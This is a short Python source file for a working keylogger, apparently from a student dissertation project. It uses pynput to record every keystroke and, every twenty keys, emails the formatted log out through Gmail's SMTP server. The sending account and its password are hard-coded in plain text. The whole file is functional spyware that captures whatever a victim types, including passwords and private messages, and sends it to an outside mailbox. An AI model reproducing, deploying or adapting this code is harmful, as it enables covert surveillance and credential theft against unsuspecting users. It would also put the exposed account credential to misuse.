import pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener
import smtplib

keys = []
count = 1

def on_press(key): #For each key, logs
    global count
    keys.append(str(key))
    count += 1
    #Sends less spam and the device does not noticeably lag
    if (count % 20 == 0): sendString(keys) 

def sendString(string):#Making string more readable
    email = ""
    for i in string:
        i = i.replace("'", "")
        if i == "Key.space": i = " "
        elif ("Key." in i): i = "[" + i.replace("Key.", "") + "]"
        email += i
    sendEmail(email)
    
def sendEmail(message): #Creates email
    password = "gdkljcdmlxkehbty"
    email = "dissertationkeylogger@gmail.com"
    #connects to gmail with secure socket layer
    server = smtplib.SMTP_SSL(host="smtp.gmail.com", port=465) 
    server.login(email, password) #Logs in
    server.sendmail(email, email, message) #Send mail
    server.quit() #Closes when used and unnecessary

#Makes the on_press work, reading each key
with Listener(on_press = on_press) as listener: 
    listener.join()
